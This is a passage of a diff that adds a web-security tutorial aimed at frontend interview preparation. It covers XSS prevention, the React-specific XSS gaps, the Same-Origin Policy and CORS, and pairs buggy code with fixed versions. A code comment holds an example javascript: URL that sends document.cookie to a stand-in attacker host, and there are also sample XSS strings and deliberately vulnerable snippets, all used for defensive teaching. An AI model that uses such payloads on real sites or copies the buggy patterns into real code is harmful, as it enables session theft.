+  ALLOWED_ATTR: ['href'],   // 👈 allowlist, not blocklist
+});
+el.innerHTML = clean;</code></pre>
+
+<p>Note the shape: you list what's <em>allowed</em>, and everything else dies. Never the reverse. A blocklist is a promise that you thought of every dangerous thing, and you didn't. Nobody has.</p>
+
+<p>There's also a built-in browser API arriving for exactly this — <code>Element.setHTML()</code>, backed by the Sanitizer API — which does allowlist sanitisation natively. Nice thing to mention; check support before relying on it.</p>
+
+<h4>4. Never <code>eval</code> anything that came from outside</h4>
+
+<p><code>eval</code>, <code>new Function</code>, <code>setTimeout('someString')</code>, and <code>setInterval</code> with a string all take text and execute it as code. If any part of that text is attacker-influenced, you've handed over the keys directly. There's essentially never a good reason for this in application code.</p>
+
+<h4>5. CSP as defence in depth</h4>
+
+<p>A Content Security Policy tells the browser "only execute scripts from these places." If you have a CSP and an attacker injects a script tag anyway, the browser refuses to run it. That's a genuinely valuable extra layer — and it gets its own section later.</p>
+
+<p>But I want to be blunt about its place in the list: <strong>CSP is a seatbelt, not a reason to drive badly.</strong> A CSP with the wrong directive, an overlooked <code>unsafe-inline</code>, or a gap for a JSONP endpoint on an allowlisted CDN can be bypassed. Fix the injection; deploy CSP as well.</p>
+
+<h2 id="xss-react"><span class="num">Part 3</span>XSS in React specifically</h2>
+
+<p>Here's a question I ask a lot: <em>is React immune to XSS?</em></p>
+
+<p>The answer people give is "yes, React escapes everything." That's about 80% right, which in an interview is worse than knowing exactly where the 20% is.</p>
+
+<p>Let's establish the true part first. When you write this:</p>
+
+<pre class="solo"><code>function Comment({ body }) {
+  return &lt;p&gt;{body}&lt;/p&gt;;
+}</code></pre>
+
+<p>…that <code>{body}</code> is not string concatenation. JSX compiles to <code>React.createElement('p', null, body)</code>, and React sets that child as <strong>text</strong>, not markup. Under the hood it ends up doing the equivalent of <code>textContent</code>. If <code>body</code> is <code>&lt;img src=x onerror=alert(1)&gt;</code>, the user sees those literal characters on the page.</p>
+
+<p>So the default path is safe — genuinely, structurally safe, not "safe if you remember." That's a big deal, and it's why the XSS rate in React apps is much lower than in the jQuery era. React had to <em>go out of its way</em> to build an escape hatch, and it named that hatch with a scary word on purpose.</p>
+
+<h3>The five ways you re-open the hole</h3>
+
+<h4>1. <code>dangerouslySetInnerHTML</code></h4>
+
+<p>The obvious one. It's deliberately ugly to type, and the awkward object shape (<code>{{ __html: ... }}</code>) exists so that it's impossible to do accidentally and trivial to grep for.</p>
+
+<div class="label bad">❌ Buggy</div>
+<pre><code>&lt;div dangerouslySetInnerHTML={{ __html: post.body }} /&gt;</code></pre>
+
+<div class="label good">✅ Fixed</div>
+<pre><code>&lt;div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }} /&gt;</code></pre>
+
+<p>Better still, sanitise once on write rather than on every render, and keep sanitised and raw in separate fields so you always know which is which.</p>
+
+<h4>2. <code>href</code> with a user-supplied URL</h4>
+
+<p>This one catches people who feel very safe. React escapes the <em>value</em> of an attribute, so you can't break out of the quotes. But it doesn't validate the URL <em>scheme</em>:</p>
+
+<div class="label bad">❌ Buggy — no innerHTML anywhere, still XSS</div>
+<pre><code>&lt;a href={user.website}&gt;My site&lt;/a&gt;
+
+// user.website = "javascript:fetch('//evil.co?c='+document.cookie)"
+// → one click and it runs. In your origin.</code></pre>
+
+<p>The fix is to check the scheme against an allowlist before rendering. And do the check by <em>parsing</em>, not by string-matching the prefix, because <code>java\tscript:</code> and <code>JaVaScRiPt:</code> and leading-whitespace variants all still work in some parsers:</p>
+
+<div class="label good">✅ Fixed</div>
+<pre><code>function safeUrl(raw) {
+  try {
+    const u = new URL(raw, window.location.origin);
+    return ['http:', 'https:', 'mailto:'].includes(u.protocol)
+      ? u.href
+      : '#';           // 👈 anything else gets neutered
+  } catch {
+    return '#';
+  }
+}
+
+&lt;a href={safeUrl(user.website)} rel="noopener noreferrer"&gt;My site&lt;/a&gt;</code></pre>
+
+<p>The same applies to <code>src</code> on iframes, <code>formAction</code>, and <code>xlink:href</code> on SVG. Newer React versions warn on <code>javascript:</code> URLs, but don't rely on the framework version to be your security control.</p>
+
+<h4>3. Spreading unvalidated props</h4>
+
+<pre class="solo"><code>&lt;div {...propsFromApi} /&gt;   // 👈 what's in there?</code></pre>
+
+<p>If that object came from an API and contains <code>dangerouslySetInnerHTML</code>, or an <code>href</code>, you've just handed the API control over your DOM. Spreading is convenient and it's fine for props you constructed; it's a hole for props you received.</p>
+
+<h4>4. <code>ref</code> plus direct DOM manipulation</h4>
+
+<p>The moment you reach past React to the real DOM node, React's escaping stops applying, because React isn't involved:</p>
+
+<div class="label bad">❌ Buggy</div>
+<pre><code>useEffect(() =&gt; {
+  chartRef.current.innerHTML = data.tooltipHtml;  // 👈 React can't help you here
+}, [data]);</code></pre>
+
+<p>Same for anything you do inside a D3, Chart.js, or map-library integration. Third-party libraries that take an "html" option are a classic hiding place for this.</p>
+
+<h4>5. Server-rendering state into a <code>&lt;script&gt;</code> tag</h4>
+
+<p>We covered the mechanism above; here's the React shape of it. Server-side rendering usually ships the initial store alongside the HTML so the client can hydrate without a second fetch:</p>
+
+<div class="label bad">❌ Buggy</div>
+<pre><code>&lt;script&gt;
+  window.__PRELOADED__ = ${JSON.stringify(store.getState())}
+&lt;/script&gt;</code></pre>
+
+<p>If any user-controlled string in that state contains <code>&lt;/script&gt;</code>, the block closes early and everything after it is live HTML. Escape <code>&lt;</code>, <code>&gt;</code> and <code>&amp;</code> to their <code>\uXXXX</code> forms as shown earlier, or serialise into a <code>&lt;script type="application/json"&gt;</code> block and <code>JSON.parse(el.textContent)</code> on the client — inside that element type, the browser isn't looking for tags, though it <em>is</em> still looking for <code>&lt;/script&gt;</code>, so escape anyway.</p>
+
+<div class="callout note">
+  <span class="ctitle">Trusted Types — the structural fix</span>
+  <p>Everything above relies on humans not making mistakes. Trusted Types flips that. You send a header:</p>
+  <p><code>Content-Security-Policy: require-trusted-types-for 'script'</code></p>
+  <p>and now the browser <em>throws a TypeError</em> if anyone assigns a plain string to a dangerous sink like <code>innerHTML</code>. The only thing those sinks accept is a special object minted by a policy you registered explicitly:</p>
+  <pre style="margin-top:0"><code>const policy = trustedTypes.createPolicy('app-html', {
+  createHTML: (input) =&gt; DOMPurify.sanitize(input),
+});
+el.innerHTML = policy.createHTML(userInput);  // ✅ allowed
+el.innerHTML = userInput;                     // ❌ TypeError</code></pre>
+  <p>It converts "did we remember to sanitise everywhere?" from a code-review question into a runtime guarantee, and it funnels every DOM-XSS sink in your app through a handful of auditable functions. Chromium-based browsers support it; Firefox and Safari have been catching up. Mentioning this in an interview is a strong signal.</p>
+</div>
+
+<div class="interview">
+  <span class="ctitle">In an interview — XSS</span>
+
+  <h4>How it gets asked</h4>
+  <p>"What is XSS?" · "What are the types of XSS and which is most severe?" · "How would you safely render user-generated HTML?" · "Is React immune to XSS?" · "You're reviewing a PR with <code>dangerouslySetInnerHTML</code> — what do you ask?" · "Walk me through how you'd audit a page for DOM XSS."</p>
+
+  <div class="say">
+    <span class="tag">Model answer — say this out loud</span>
+    <p>"XSS is when attacker-controlled data ends up being interpreted as code inside my origin. That matters because the browser's whole trust model is per-origin, so injected script gets everything my page has — the DOM, non-HttpOnly cookies, localStorage, and the ability to make authenticated requests as the user.</p>
+    <p>There are three delivery routes: stored, where it's persisted server-side and hits everyone who loads the page, which is the worst; reflected, where it's echoed back from a query param and needs a lure; and DOM-based, where the server never sees it at all — a client source like <code>location.hash</code> flows into a client sink like <code>innerHTML</code>.</p>
+    <p>The primary fix is contextual output encoding — and the context matters, because escaping for HTML body text is different from an attribute, a URL, or inside a script tag. In practice that means preferring <code>textContent</code> over <code>innerHTML</code>, using DOMPurify with an allowlist if I genuinely have to render user HTML, and never eval'ing untrusted input. Then CSP on top as defence in depth."</p>
+  </div>
+
+  <p><strong>Why this lands:</strong> you led with the trust model rather than a definition, you distinguished the three types <em>by mechanism</em> instead of reciting names, and you ranked defences instead of listing them. The phrase "context matters" is a strong signal on its own — it's the thing people who've only read a blog post leave out.</p>
+
+  <h4>Follow-up: "Is React immune to XSS?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"Safe by default, not immune. JSX interpolation escapes values because it sets them as text nodes rather than parsing markup, so the common case is handled structurally. But there are five ways back in: <code>dangerouslySetInnerHTML</code>; a user-controlled <code>href</code>, which React escapes as a value but doesn't scheme-check, so <code>javascript:</code> URLs still execute; spreading unvalidated props from an API; going around React with a <code>ref</code> and touching the DOM directly; and server-rendering state into a script tag where a <code>&lt;/script&gt;</code> in the data closes the block early."</p>
+  <p>Naming <code>href</code> is the differentiator here — almost everyone names <code>dangerouslySetInnerHTML</code> and stops.</p>
+  </details>
+
+  <h4>Follow-up: "When is <code>dangerouslySetInnerHTML</code> acceptable?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>Two cases. <strong>One:</strong> the HTML came from a trusted source you control — your own CMS output, markdown you rendered server-side from your own content, an email template. <strong>Two:</strong> the HTML came from users but has been through a real sanitiser with an allowlist, ideally at write time so it isn't re-run on every render and so you can audit what's stored.</p>
+  <p>What makes the answer good is adding the operational bit: sanitise as close to the sink as you can, keep the raw and sanitised versions in different fields so nobody confuses them, and if the "trusted CMS" has authors who aren't fully trusted, it isn't trusted — sanitise it too.</p>
+  </details>
+
+  <h4>Follow-up: "Why isn't sanitising on input enough?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>Because the right escaping depends on the output context, and you don't know the context at input time — the same string may go to HTML body, an attribute, a script tag, an email, a PDF. Because it destroys legitimate data (names with apostrophes, code snippets). And because data reaches the database through paths that skip your input filter — imports, admin tools, other services — whereas the output path is the one gate everything passes through. Validate on input for shape and length; encode on output for safety.</p>
+  </details>
+
+  <h4>Follow-up: "How would you find DOM XSS in a codebase?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>Grep for sinks and trace backwards: <code>innerHTML</code>, <code>outerHTML</code>, <code>insertAdjacentHTML</code>, <code>document.write</code>, <code>eval</code>, <code>new Function</code>, <code>setTimeout</code> with a string, <code>dangerouslySetInnerHTML</code>, and assignments to <code>href</code>/<code>src</code>. For each, ask whether the value can be traced to a source: <code>location.*</code>, <code>document.referrer</code>, <code>postMessage</code>, storage, or an API response containing other users' content. Then lint it so it can't regress, and consider Trusted Types to make the whole class impossible.</p>
+  </details>
+
+  <h4>Trap</h4>
+  <div class="trap"><span class="t">Wrong:</span> "We escape <code>&lt;script&gt;</code> tags, so we're fine." Nearly every real payload uses an event-handler attribute rather than a script tag, and <code>innerHTML</code> doesn't execute injected script tags anyway. Blocklisting a string is not a defence. <br><span class="t">Say instead:</span> "We allowlist — either by encoding everything, or by parsing and keeping only known-safe tags and attributes."</div>
+</div>
+
+<h2 id="sop"><span class="num">Part 4</span>The Same-Origin Policy (read this before CORS)</h2>
+
+<p>Now for the topic people most reliably explain backwards. We're going to be careful.</p>
+
+<p>The mistake is starting with CORS. CORS makes no sense on its own, because CORS is a way of <em>relaxing</em> a rule — and if you don't know the rule precisely, "relaxing it" is meaningless noise. So: the rule.</p>
+
+<h3>The scenario the rule exists to prevent</h3>
+
+<p>You're logged into <code>https://bank.com</code>. In another tab you open <code>https://cat-pictures.example</code>, which is run by someone with bad intentions. Their page contains:</p>
+
+<pre class="solo"><code>fetch('https://bank.com/api/account')
+  .then(r =&gt; r.json())
+  .then(data =&gt; {
+    // send data.balance and data.accountNumber to the attacker
+  });</code></pre>
+
+<p>Here's the uncomfortable part: <strong>your browser will happily attach your bank.com cookies to that request</strong>, because — as we'll see properly in the CSRF section — cookies are attached based on <em>where the request is going</em>, not who asked for it. So bank.com receives a fully authenticated request and cheerfully returns your account details.</p>
+
+<p>If JavaScript on cat-pictures.example could read that response, the web would be unusable. Every site you visited could silently vacuum up every other site you were logged into.</p>
+
+<p>So the browser steps in. <strong>The Same-Origin Policy says: script from origin A may not read the response from origin B.</strong> The response comes back, the browser holds it, looks at it, and hands your JS an error instead.</p>
+
+<h3>The precise wording — this is the whole interview</h3>
+
+<p>Read this slowly, because the details are the answer to three separate follow-up questions:</p>
+
+<div class="callout note">
+  <span class="ctitle">What SOP actually does</span>
+  <p><strong>It restricts <em>reading</em> cross-origin responses from script.</strong></p>
+  <p><strong>It does NOT stop the request from being sent.</strong> The request goes out. It reaches the server. The server processes it. If it was a <code>DELETE /api/posts/42</code>, the post is gone. The browser only blocks your JavaScript from <em>seeing the answer</em>.</p>
+  <p><strong>It does NOT apply to ordinary HTML elements.</strong> <code>&lt;img src&gt;</code>, <code>&lt;script src&gt;</code>, <code>&lt;link rel=stylesheet&gt;</code>, <code>&lt;video&gt;</code>, <code>&lt;iframe&gt;</code>, and <strong>form submissions</strong> all cross origins freely — that's how the web works. You can embed any image from any domain. What you <em>can't</em> do is read its pixels back out (a canvas gets "tainted"), or read the text of a cross-origin script, or read the frame's DOM.</p>
+</div>
+
+<p>That second point deserves a moment. A lot of people carry a mental image of SOP as a firewall that stops the packet. It isn't. It's more like a <strong>mail room</strong>: your letter goes out and gets delivered, the reply comes back to the building, and the mail room decides whether you're cleared to open it. The recipient already read your letter and acted on it either way.</p>
+
+<p>Once that clicks, CSRF stops being mysterious. CSRF is precisely the attack that lives in the gap between "the request was sent and processed" and "you couldn't read the response." The attacker doesn't <em>need</em> the response — they just needed the transfer to happen.</p>
+
+<h3>What SOP protects, exactly</h3>
+
+<p>SOP isn't one rule; it's a family of rules applied to different things:</p>
+
+<ul>
+  <li><strong>Network responses</strong> (fetch/XHR): can't read cross-origin bodies or most headers.</li>
+  <li><strong>The DOM of iframes</strong>: <code>iframe.contentWindow.document</code> throws if the frame is a different origin. You can still <code>postMessage</code> to it — that's the sanctioned, explicit channel, and you should always check <code>event.origin</code> when receiving.</li>
+  <li><strong>Storage</strong>: <code>localStorage</code>, <code>sessionStorage</code>, IndexedDB are partitioned per origin. <code>https://app.example.com</code> genuinely cannot see <code>http://app.example.com</code>'s localStorage.</li>
+  <li><strong>Canvas pixels</strong>: draw a cross-origin image, and <code>getImageData()</code> throws. Otherwise you could load a private image and read it pixel by pixel.</li>
+</ul>
+
+<p>Cookies, notably, follow their own older and looser rules based on domain rather than origin. That mismatch is the seed of several problems we'll hit later.</p>
+
+<h2 id="cors"><span class="num">Part 5</span>CORS — the server's permission slip</h2>
+
+<p>Now the rule is clear, so the exception makes sense.</p>
+
+<p>SOP is a good default, but sometimes cross-origin reading is exactly what you want. Your React app on <code>https://app.example.com</code> genuinely does need to call <code>https://api.example.com</code>. Different host, different origin, blocked by default. That's correct behaviour and also deeply annoying.</p>
+
+<p>So we need a way for the API to say: <em>"it's fine, I know about app.example.com, let them read my responses."</em></p>
+
+<p>That mechanism is <strong>Cross-Origin Resource Sharing</strong>. And here's the one-sentence version to carry into an interview:</p>
+
+<div class="callout wait">
+  <span class="ctitle">The sentence</span>
+  <p><strong>CORS is a way for a server to tell the browser to relax the Same-Origin Policy for specific origins. The browser enforces it; the server declares it. It protects users, not servers.</strong></p>
+</div>
+
+<p>Every word there is doing work:</p>
+
+<ul>
+  <li><strong>relax</strong> — CORS never adds a restriction. It only ever removes one. A "CORS error" isn't CORS blocking you; it's CORS <em>failing to unblock</em> you, so the default SOP restriction stayed in place.</li>
+  <li><strong>the browser enforces it</strong> — the check happens in the user's browser, on the client. Nothing about it happens on the server beyond emitting a header.</li>
+  <li><strong>the server declares it</strong> — which is why you cannot fix it from the frontend, and we'll spend some time on that.</li>
+  <li><strong>protects users</strong> — it stops <em>your</em> browser from leaking data you have access to. The API is unbothered either way.</li>
+</ul>
+
+<p>My analogy: CORS is a <strong>guest list at a private club</strong>. The bouncer (your browser) has a standing rule that you can't take the contents out of the building. But the club owner (the API server) can post a list saying "guests from app.example.com may take their food home." The bouncer reads the list and lets you through. The list means nothing to someone who isn't going through the front door at all — which is the whole point of the next section.</p>
+
+<h3>Simple requests vs preflighted requests</h3>
+
+<p>There are two shapes a cross-origin request can take, and the difference is one of the top three CORS interview questions.</p>
+
+<h4>Simple requests</h4>
+
+<p>Some cross-origin requests were already possible before <code>fetch</code> existed — you could always submit an HTML form to another domain, or load an image. Those requests were part of the web from day one, and blocking them retroactively would break the internet.</p>
+
+<p>So the spec defines a set of requests that are "no more dangerous than an HTML form," and lets them go out immediately. A request is <strong>simple</strong> when all of these hold:</p>
+
+<ul>
+  <li>Method is <code>GET</code>, <code>POST</code>, or <code>HEAD</code></li>
+  <li>The only headers you set are on a small safelist (<code>Accept</code>, <code>Accept-Language</code>, <code>Content-Language</code>, <code>Content-Type</code>, and a couple more)</li>
+  <li>If <code>Content-Type</code> is set, it's one of exactly three values: <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code></li>
+  <li>No <code>ReadableStream</code> body, and no event listeners on <code>XMLHttpRequest.upload</code></li>
+</ul>
+
+<p>For a simple request, the browser just sends it, with an <code>Origin</code> header attached saying where it came from. The server responds. <strong>Then</strong> the browser checks the response headers, and if the permission isn't there, it throws away the body and hands your code an error.</p>
+
+<p>Sit with that ordering for a second, because it's the crux of CSRF: <strong>the request already happened.</strong> Blocking is after the fact.</p>
+
+<h4>Preflighted requests</h4>
+
+<p>Anything outside that set — <code>PUT</code>, <code>PATCH</code>, <code>DELETE</code>, a custom <code>X-Api-Key</code> header, or (the big one in practice) <code>Content-Type: application/json</code> — is a request that a plain HTML form <em>couldn't</em> have made. Those could do real damage to a server that was written back when "if it's cross-origin it must be a form" was a safe assumption.</p>
+
+<p>So the browser asks permission <em>first</em>. It sends an <code>OPTIONS</code> request — the <strong>preflight</strong> — describing what it's about to do, and only proceeds if the server approves.</p>
+
+<figure>
+<svg viewBox="0 0 700 330" role="img" aria-label="Sequence diagram of a CORS preflight request">
+  <defs>
+    <marker id="a2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+      <path d="M0,0 L7,3.2 L0,6.4 z" fill="#5c5867"/>
+    </marker>
+  </defs>
+  <g font-family="ui-monospace, monospace" font-size="11.5" fill="#232129">
+    <rect x="20" y="8" width="150" height="30" rx="6" fill="#f2edfd" stroke="#c4aef0"/>
+    <text x="95" y="28" text-anchor="middle" font-size="12" font-weight="700">Browser</text>
+    <rect x="500" y="8" width="180" height="30" rx="6" fill="#eaf2fa" stroke="#9dc0e0"/>
+    <text x="590" y="28" text-anchor="middle" font-size="12" font-weight="700">api.example.com</text>
+    <line x1="95" y1="42" x2="95" y2="315" stroke="#c9c4d1" stroke-dasharray="4 4"/>
+    <line x1="590" y1="42" x2="590" y2="315" stroke="#c9c4d1" stroke-dasharray="4 4"/>
+
+    <text x="105" y="62" font-size="11" fill="#5c5867">app.example.com calls fetch('…', {method:'PATCH', headers:{'Content-Type':'application/json'}})</text>
+
+    <line x1="98" y1="88" x2="585" y2="88" stroke="#5c5867" stroke-width="1.5" marker-end="url(#a2)"/>
+    <text x="110" y="83" font-weight="700" fill="#8a5a00">1. OPTIONS  (the preflight — no body, no cookies by default)</text>
+    <text x="130" y="104" fill="#5c5867">Origin: https://app.example.com</text>
+    <text x="130" y="119" fill="#5c5867">Access-Control-Request-Method: PATCH</text>
+    <text x="130" y="134" fill="#5c5867">Access-Control-Request-Headers: content-type</text>
+
+    <line x1="585" y1="158" x2="100" y2="158" stroke="#14713d" stroke-width="1.5" marker-end="url(#a2)"/>
+    <text x="150" y="153" font-weight="700" fill="#14713d">2. 204 No Content</text>
+    <text x="130" y="174" fill="#5c5867">Access-Control-Allow-Origin: https://app.example.com</text>
+    <text x="130" y="189" fill="#5c5867">Access-Control-Allow-Methods: GET, POST, PATCH</text>
+    <text x="130" y="204" fill="#5c5867">Access-Control-Allow-Headers: content-type</text>
+    <text x="130" y="219" fill="#5c5867">Access-Control-Max-Age: 600</text>
+
+    <line x1="98" y1="245" x2="585" y2="245" stroke="#5c5867" stroke-width="1.5" marker-end="url(#a2)"/>
+    <text x="110" y="240" font-weight="700">3. the actual PATCH  (now, and only now)</text>
+
+    <line x1="585" y1="278" x2="100" y2="278" stroke="#14713d" stroke-width="1.5" marker-end="url(#a2)"/>
+    <text x="150" y="273" font-weight="700" fill="#14713d">4. 200 + Access-Control-Allow-Origin (again!)</text>
+    <text x="110" y="300" fill="#b3243b" font-size="11">If step 2 or step 4 is missing the header → browser hands JS a CORS error.</text>
+  </g>
+</svg>
+<figcaption>The preflight is a separate round trip that happens before your actual request. Your JS never sees it.</figcaption>
+</figure>
+
+<p>Three things about this diagram that people get wrong:</p>
+
+<ol>
+  <li><strong>The preflight is invisible to your code.</strong> You called <code>fetch</code> once; the browser made two requests. You can't intercept the OPTIONS, you can't add headers to it, and a service worker won't see it in most cases. It's browser machinery.</li>
+  <li><strong>The real response needs the headers too.</strong> Passing the preflight isn't a permanent pass — every actual response must carry <code>Access-Control-Allow-Origin</code> as well. Servers that only handle OPTIONS are a classic half-fix.</li>
+  <li><strong>The preflight itself carries no cookies</strong> and no auth. So an endpoint that returns 401 on unauthenticated OPTIONS breaks CORS entirely — the preflight fails and the real request never happens. This is a very common real-world bug: "it works in curl, it 401s in the browser."</li>
+</ol>
+
+<h3>The response headers, and what each one is for</h3>
+
+<div class="scroller">
+<table>
+  <thead><tr><th>Header</th><th>What it does</th></tr></thead>
+  <tbody>
+    <tr>
+      <td><code>Access-Control-Allow-Origin</code></td>
+      <td>The core one. Either a single exact origin (<code>https://app.example.com</code>) or <code>*</code>. <strong>Not a list</strong>, not a wildcard pattern — if you support several origins, you check the incoming <code>Origin</code> header against your own allowlist and echo back the matching one.</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Allow-Credentials: true</code></td>
+      <td>Required if the request carries cookies or HTTP auth. Without it, credentialed responses are rejected even when the origin matches.</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Allow-Methods</code></td>
+      <td>Preflight response only. Which methods are permitted.</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Allow-Headers</code></td>
+      <td>Preflight response only. Which non-safelisted request headers are permitted. Miss <code>authorization</code> or <code>content-type</code> here and it fails.</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Expose-Headers</code></td>
+      <td>By default your JS can read only a handful of response headers. Want <code>X-Total-Count</code> or a custom pagination header? Name it here or <code>response.headers.get()</code> returns null.</td>
+    </tr>
+    <tr>
+      <td><code>Access-Control-Max-Age</code></td>
+      <td>Seconds the browser may cache the preflight result, so it stops re-asking on every request. Big performance win; browsers cap it (Chrome at 2 hours, Firefox at 24).</td>
+    </tr>
+    <tr>
+      <td><code>Vary: Origin</code></td>
+      <td>Not a CORS header, but essential when you echo the origin. It tells caches "this response differs per Origin header." Without it, a CDN can serve the response cached for origin A to a request from origin B — either breaking your app or leaking across origins.</td>
+    </tr>
+  </tbody>
+</table>
+</div>
+
+<h3>Why <code>credentials: 'include'</code> can't be combined with <code>*</code></h3>
+
+<p>This one has a genuinely satisfying reason, and explaining it well signals real understanding.</p>
+
+<p>By default, <code>fetch</code> does <em>not</em> send cookies cross-origin. To include them you opt in:</p>
+
+<pre class="solo"><code>fetch('https://api.example.com/me', {
+  credentials: 'include',   // 👈 attach cookies cross-origin
+});</code></pre>
+
+<p>Do this against a server responding <code>Access-Control-Allow-Origin: *</code> and the browser refuses, with a very specific error about the wildcard.</p>
+
+<p>Why? Because <code>*</code> means <strong>"any origin may read this."</strong> That's a fine thing to say about public data — a weather API, a font file. It is a catastrophic thing to say about a response that was personalised using the visitor's session cookie.</p>
+
+<p>If it were allowed, <code>evil.example</code> could fetch <code>https://api.yourbank.com/me</code> with credentials, the browser would attach your cookie, the server would return <em>your</em> data, and the wildcard would authorise evil.example to read it. That's the exact attack SOP exists to stop.</p>
+
+<p>So the spec forbids the combination outright. With credentials, you must name a <strong>specific</strong> origin — which forces the server to make a deliberate decision about who it trusts. The fix:</p>
+
+<div class="label good">✅ Fixed — server side</div>
+<pre><code>const ALLOWED = new Set([
+  'https://app.example.com',
+  'https://staging.example.com',
+]);
+
+if (ALLOWED.has(req.headers.origin)) {
+  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // 👈 echo, don't wildcard
+  res.setHeader('Access-Control-Allow-Credentials', 'true');
+  res.setHeader('Vary', 'Origin');                                  // 👈 don't forget this
+}</code></pre>
+
+<div class="callout myth">
+  <span class="ctitle">A common misconception — "just echo whatever origin came in"</span>
+  <p>You'll find snippets that do <code>res.setHeader('Access-Control-Allow-Origin', req.headers.origin)</code> with no check, plus <code>Allow-Credentials: true</code>. That is functionally <code>*</code> <em>with</em> credentials — every origin on the internet gets approved, including the attacker's. It's one of the most common real CORS vulnerabilities.</p>
+  <p>Related trap: sloppy allowlist matching. <code>origin.endsWith('example.com')</code> happily approves <code>https://evilexample.com</code>. Compare against a set of exact strings.</p>
+</div>
+
+<h3>Why the fix always lives on the server</h3>
+
+<p>This is where I want you to be really sure of yourself, because the question "can you fix CORS from the frontend?" is designed to catch bluffing.</p>
+
+<p>No. You cannot. And it's not a limitation — it's the point.</p>
+
+<p>The permission is granted by <em>the server that owns the data</em>, because that's the only party who knows who should be allowed to read it. If frontend code could grant itself permission, the entire mechanism would be decorative: every attacker would simply grant themselves access. That's like being turned away at the club and writing your own name on the guest list.</p>
+
+<p>So all of these are non-fixes:</p>
+
+<ul>
+  <li><strong>Setting the <code>Origin</code> header yourself.</strong> It's a <em>forbidden header name</em> — the browser sets it and silently ignores your attempt. Same for <code>Host</code>, <code>Referer</code>, and <code>Cookie</code>.</li>
+  <li><strong><code>mode: 'no-cors'</code>.</strong> The single most misunderstood option in <code>fetch</code>. It doesn't disable CORS; it opts you into an <em>opaque response</em>. Status reads as 0, headers are empty, body is unreadable. The request goes out and that's it. It's there for cases like caching a third-party asset in a service worker, not for reading JSON.</li>
+  <li><strong>An "allow CORS" browser extension.</strong> Works on your machine. Your users don't have it. And it's disabling a protection that exists for them.</li>
+  <li><strong>Switching to XHR, or axios, or jQuery.</strong> All of them go through the same browser networking stack. The enforcement isn't in the library.</li>
+</ul>
+
+<p>What you <em>can</em> legitimately do:</p>
+
+<ul>
+  <li><strong>Fix the server.</strong> If it's yours, add the headers. This is the answer 90% of the time.</li>
+  <li><strong>Use a dev proxy.</strong> Vite/Webpack dev servers can proxy <code>/api/*</code> to the real API. Your browser then only ever talks to <code>localhost:5173</code> — same origin, no CORS involved. The dev server, being a server, isn't bound by SOP at all.</li>
+  <li><strong>Use a backend-for-frontend in production.</strong> Same trick, permanently: your own server calls the third-party API server-to-server and re-exposes it same-origin. This is the standard answer for third-party APIs you don't control (and it lets you keep the API key off the client, which you wanted anyway).</li>
+  <li><strong>Serve API and app from the same origin</strong> via path-based routing at the CDN/load balancer — <code>example.com/api/*</code> to the API, everything else to the app. CORS disappears entirely.</li>
+</ul>
+
+<h3>The big one: CORS is not a security control on your API</h3>
+
+<p>If you take one thing from this section, take this.</p>
+
+<p>CORS is a rule the <strong>browser</strong> follows. It is implemented in browsers, for browsers, to protect browser users. It is not enforced anywhere else in the universe.</p>
+
+<p>So: curl ignores it. Postman ignores it. A Python script ignores it. Your mobile app ignores it. A server-side script ignores it. Anyone can send any request to your API with any headers, from anywhere, and simply read the response — no browser, no policy, no enforcement.</p>
+
+<p>Which means <strong>authentication and authorization must be enforced on the server, always</strong>. CORS says who may <em>read a response in a browser</em>. It says nothing about who may <em>call the endpoint</em>. If your endpoint returns another user's data to anyone who asks, a locked-down CORS config buys you exactly zero. The check belongs in your handler: is this request authenticated, and is this user allowed to see this resource?</p>
+
+<p>The flip side is the reassuring bit: a strict CORS policy is not what's keeping your API safe, and a permissive one on genuinely public data isn't a vulnerability. <code>Access-Control-Allow-Origin: *</code> on a public docs endpoint is completely fine.</p>
+
+<div class="interview">
+  <span class="ctitle">In an interview — SOP &amp; CORS</span>
+
+  <h4>How it gets asked</h4>
+  <p>"Explain CORS." · "What's a preflight request and when does it happen?" · "Why does this fetch fail in the browser but work in Postman?" · "Can you fix a CORS error from the frontend?" · "Does CORS protect my API?" · "Why can't you use <code>*</code> with credentials?"</p>
+
+  <div class="say">
+    <span class="tag">Model answer — say this out loud</span>
+    <p>"By default the browser enforces the Same-Origin Policy: script on one origin — scheme, host and port — can't read responses from another origin. Note it blocks <em>reading the response</em>; it doesn't stop the request being sent, and it doesn't apply to things like images, scripts, or form posts.</p>
+    <p>CORS is how a server opts out of that restriction for specific origins. The server sends <code>Access-Control-Allow-Origin</code>, and the browser enforces what the server declared. For anything beyond a simple GET or form-style POST — a PUT, a custom header, JSON content-type — the browser first sends an OPTIONS preflight to ask permission, and only sends the real request if it's approved.</p>
+    <p>The important nuance is that CORS protects users, not servers. It's browser-enforced, so a non-browser client ignores it completely — which means it's never a substitute for authentication and authorization on the server. And you can't fix it from the frontend: the permission has to come from the server that owns the data, or you route around it with a proxy."</p>
+  </div>
+
+  <p><strong>Why this lands:</strong> the phrase "blocks reading the response, not sending the request" is the single highest-signal sentence in this whole topic. Combined with "protects users, not servers," you've demonstrated you understand the threat model rather than the error message.</p>
+
+  <h4>Follow-up: "Does CORS protect my API?"</h4>
+  <details><summary>Show the answer</summary>
+  <p>"No. CORS is enforced by browsers, so it only constrains browser-based clients. Anything that isn't a browser — curl, a script, a mobile app, another server — ignores it and reads the response normally. It protects <em>my users</em> from having their authenticated data read by a page on some other origin. Protecting the API itself is authn/authz, rate limiting, and input validation on the server."</p>
+  <p>If they push: yes, it does provide one server-relevant thing — the preflight means a cross-origin page can't trivially fire off a <code>DELETE</code> with a JSON body without approval. But that's incidental, not the design goal, and it doesn't cover form-shaped requests.</p>
+  </details>
+
+  <h4>Follow-up: "Why does it work in Postman but not the browser?"</h4>
+  <details><summary>Show the answer</summary>
